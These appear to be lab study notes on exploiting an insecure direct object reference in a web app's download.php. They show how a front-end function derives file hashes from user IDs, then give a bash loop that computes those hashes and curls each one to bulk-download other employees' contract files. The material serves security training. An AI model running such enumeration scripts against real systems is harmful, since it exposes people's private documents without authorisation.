### Example
A webapp has a download file feature but hashes the file name when sending the request to download it

Using a `download.php` script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks.

### Function Disclosure
As most modern web applications are developed using JavaScript frameworks, like `Angular`, `React`, or `Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

This function appears to be sending a `POST` request with the `contract` parameter, which is what we saw above. The value it is sending is an `md5` hash using the `CryptoJS` library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable. Going back to the earlier link where the function was called, we see it calling `downloadContract('1')`. So, the final value being used in the `POST` request is the `base64` encoded string of `1`, which was then `md5` hashed.

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:

```shell
adot8@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
> [!NOTE] Note
> We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

### Exploit Automation
We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

url=

for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -OJ '$url/download.php?contract=$hash'
    done
done
```
